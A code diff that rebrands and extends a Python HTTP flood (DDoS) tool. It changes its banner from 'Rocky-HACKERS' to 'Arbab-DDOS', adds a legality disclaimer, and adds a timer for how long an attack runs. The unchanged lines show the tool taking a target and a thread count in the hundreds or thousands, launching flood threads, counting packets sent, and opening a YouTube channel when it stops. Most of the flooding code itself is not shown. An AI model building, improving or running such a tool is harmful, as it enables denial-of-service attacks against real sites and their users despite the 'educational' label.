@@ -1,4 +1,3 @@
-
 #!/usr/bin/env python3
 
 import os, socket, threading, time, random, sys, webbrowser
@@ -13,6 +12,7 @@ import pyfiglet
 console = Console()
 packets = 0
 lock = threading.Lock()
+start_time = None
 
 # Clear screen
 def clear():
@@ -23,13 +23,14 @@ def show_banner(text, style):
     banner = pyfiglet.figlet_format(text)
     console.print(Align.center(f"[{style}]{banner}[/{style}]"))
 
-# ROCKY promo + redirect
+# Intro screen
 def dht_intro():
     clear()
-    show_banner("Rocky-HACKERS", "bold red")
+    show_banner("Arbab-DDOS", "bold red")
     console.print(Panel.fit(
-        "[green]This tool is for [bold]educational & testing[/bold] use only.",
-        title="[bold magenta]Rocky Hackers Official Tool[/bold magenta]",
+        "[green]This tool is for [bold]educational & testing[/bold] use only.\n"
+        "[yellow]Unauthorized DDOS attacks are illegal![/yellow]",
+        title="[bold magenta]Dark Hackers Official Tool[/bold magenta]",
         border_style="bright_magenta",
         padding=(1, 2)
     ))
@@ -94,6 +95,7 @@ def http_flood(ip, port, host, path):
             pass
 
 def main():
+    global start_time
     dht_intro()
     domain, ip, port, path = get_target()
     threads = int(Prompt.ask("[cyan]Enter number of threads (e.g. 200, 500, 1000)[/cyan]"))
@@ -108,6 +110,7 @@ def main():
     ))
 
     console.print("\n[bold red]⚔️ Attacking... Press Ctrl+C to stop.[/bold red]\n")
+    start_time = time.time()
 
     # Start threads
     for _ in range(threads):
@@ -120,8 +123,10 @@ def main():
             time.sleep(1)
             console.print(f"[📦] Packets Sent: [bold yellow]{packets}[/bold yellow]", end="\r")
     except KeyboardInterrupt:
+        duration = time.time() - start_time
         console.print(f"\n\n[bold red]✋ Attack stopped by user[/bold red]")
         console.print(f"[bold green]✅ Total packets sent: {packets}[/bold green]")
+        console.print(f"[cyan]⏱️ Attack Duration: {duration:.2f} seconds[/cyan]")
         try:
             webbrowser.open("https://youtube.com/@dht-hackers_10", new=2)
         except:
@@ -132,4 +137,5 @@ if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
-        console.print("\n[red]⛔ Interrupted[/red
+        console.print("\n[red]⛔ Interrupted[/red]")
+        sys.exit()
